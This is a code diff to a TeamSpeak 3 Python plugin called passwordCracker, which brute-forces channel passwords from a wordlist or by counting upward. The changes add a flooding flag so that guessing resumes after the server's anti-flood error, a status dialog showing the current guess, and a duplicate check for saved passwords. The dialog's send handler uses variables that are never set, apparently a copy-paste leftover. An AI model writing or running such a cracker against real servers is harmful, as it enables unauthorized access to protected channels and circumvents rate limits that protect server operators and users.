@@ -4,6 +4,7 @@ from ts3plugin import ts3plugin
 from datetime import datetime
 from PythonQt.QtGui import QInputDialog, QWidget, QMessageBox, QDialog
 from PythonQt.QtCore import Qt, QTimer
+from pytsonui import setupUi
 
 
 def channelURL(schid=None, cid=0, name=None):
@@ -75,20 +76,22 @@ class passwordCracker(ts3plugin):
     cid = 0
     pws = []
     pwc = 0
-    pwcf = 0
+    flooding = False
     timer = QTimer()
-    interval = 250
+    interval = 300
     antiflood_delay = 2500
     step = 1
     retcode = ""
     mode = 0
+    dlg = None
+    status = ""
 
     @staticmethod
     def timestamp(): return '[{:%Y-%m-%d %H:%M:%S}] '.format(datetime.now())
 
     def __init__(self):
         content = []
-        with open(self.pwpath) as f:
+        with open(self.pwpath, encoding="utf8") as f:
             content = f.readlines()
         self.pws = [x.strip() for x in content]
         self.timer.timeout.connect(self.tick)
@@ -96,6 +99,8 @@ class passwordCracker(ts3plugin):
 
     def stop(self):
         self.timer.stop()
+        self.timer = None
+        del self.timer
         self.timer = QTimer()
 
     def menuCreated(self):
@@ -110,7 +115,12 @@ class passwordCracker(ts3plugin):
 
     def onMenuItemEvent(self, schid, atype, menuItemID, selectedItemID):
         if atype == ts3defines.PluginMenuType.PLUGIN_MENU_TYPE_CHANNEL:
-            if menuItemID == 1:
+            if menuItemID == 0:
+                if not self.dlg: self.dlg = StatusDialog(self)
+                self.dlg.show();
+                self.dlg.raise_();
+                self.dlg.activateWindow()
+            elif menuItemID == 1:
                 (err, haspw) = ts3lib.getChannelVariable(schid, selectedItemID, ts3defines.ChannelProperties.CHANNEL_FLAG_PASSWORD)
                 if not haspw:
                     (err, name) = ts3lib.getChannelVariable(schid, selectedItemID, ts3defines.ChannelProperties.CHANNEL_NAME)
@@ -135,6 +145,8 @@ class passwordCracker(ts3plugin):
                 if pw == None or pw == False or pw == "":
                     (err, name) = ts3lib.getChannelVariable(schid, selectedItemID, ts3defines.ChannelProperties.CHANNEL_NAME)
                     msgBox('No password saved for channel {0}'.format(name));return
+                elif pw in self.pws:
+                    msgBox("Not adding \"{0}\" to password db\n\nIt already exists!".format(pw), QMessageBox.Warning);return
                 self.pws.append(pw)
                 with open(self.pwpath, "a") as myfile:
                     myfile.write('\n{0}'.format(pw))
@@ -158,8 +170,8 @@ class passwordCracker(ts3plugin):
         if not atype == ts3defines.PluginItemType.PLUGIN_CHANNEL: return None
         if not self.cid == id: return None
         if not self.schid == schid: return None
-        if self.mode == 0: msg = "Trying {0} / {1}".format(self.pwc, len(self.pws))
-        elif self.mode == 1: msg = "Trying {0}".format(self.pwc)
+        if self.mode == 0: msg = "Trying: {0} / {1}\nCurrent: {2}\nStatus: {3}".format(self.pwc, len(self.pws), self.pws[self.pwc], self.status)
+        elif self.mode == 1: msg = "Trying: {0}".format(self.pwc)
         return [msg]
 
     def tick(self):
@@ -174,22 +186,20 @@ class passwordCracker(ts3plugin):
                 pw = self.pws[self.pwc]
             elif self.mode == 1: pw = str(self.pwc)
             err = ts3lib.verifyChannelPassword(self.schid, self.cid, pw, self.retcode)
+            (er, self.status) = ts3lib.getErrorMessage(err)
             if err != ts3defines.ERROR_ok:
-                (er, msg) = ts3lib.getErrorMessage(err)
-                print('ERROR {0} ({1}) while trying password \"{2}\" for channel #{3} on server #{4}'.format(msg, err, pw, self.cid, self.schid))
+                print('ERROR {0} ({1}) while trying password \"{2}\" for channel #{3} on server #{4}'.format(self.status, err, pw, self.cid, self.schid))
             # else: print('[{0}] Trying password \"{1}\" for channel #{2} on server #{3}'.format(self.pwc, pw, self.cid, self.schid))
-            self.pwc += self.step
+            if not self.flooding: self.pwc += self.step
         except: from traceback import format_exc;ts3lib.logMessage(format_exc(), ts3defines.LogLevel.LogLevel_ERROR, "pyTSon", 0)
 
     def onServerErrorEvent(self, schid, errorMessage, error, returnCode, extraMessage):
         if not returnCode == self.retcode: return
         ts3lib.requestInfoUpdate(schid, ts3defines.PluginItemType.PLUGIN_CHANNEL, self.cid)
         if error == ts3defines.ERROR_channel_invalid_password:
-            if self.pwcf != 0:
-                self.pwcf = 0
-                self.pwc = self.pwcf
+            if self.flooding: self.flooding = False
         elif error == ts3defines.ERROR_client_is_flooding:
-            self.pwcf = self.pwc
+            self.flooding = True
             self.timer.stop()
             QTimer.singleShot(self.antiflood_delay, self.startTimer)
         elif error == ts3defines.ERROR_channel_invalid_id:
@@ -238,3 +248,20 @@ class passwordCracker(ts3plugin):
         (err, name) = ts3lib.getChannelVariable(schid, self.cid, ts3defines.ChannelProperties.CHANNEL_NAME)
         msgBox("Server left\n\nStopping Cracker!", QMessageBox.Warning)
         self.schid = 0;self.cid = 0;self.pwc = 0
+
+class StatusDialog(QDialog):
+    def __init__(self, plugin, parent=None):
+        try:
+            # self.schid = schid;self.uids = uids
+            super(QDialog, self).__init__(parent)
+            setupUi(self, os.path.join(pytson.getPluginPath(), "scripts", "passwordCracker", "status.ui"))
+            self.setAttribute(Qt.WA_DeleteOnClose)
+            self.setWindowTitle('{0} - Idle'.format(plugin.name))
+        except: from traceback import format_exc;ts3lib.logMessage(format_exc(), ts3defines.LogLevel.LogLevel_ERROR, "pyTSon", 0)
+
+    def on_send_clicked(self):
+        for uid in self.uids:
+            try: ts3lib.requestMessageAdd(self.schid, uid, self.subject.text, self.message.toPlainText())
+            except: from traceback import format_exc;ts3lib.logMessage(format_exc(), ts3defines.LogLevel.LogLevel_ERROR, "pyTSon", 0)
+
+    def on_pushButton_3_clicked(self): self.close()
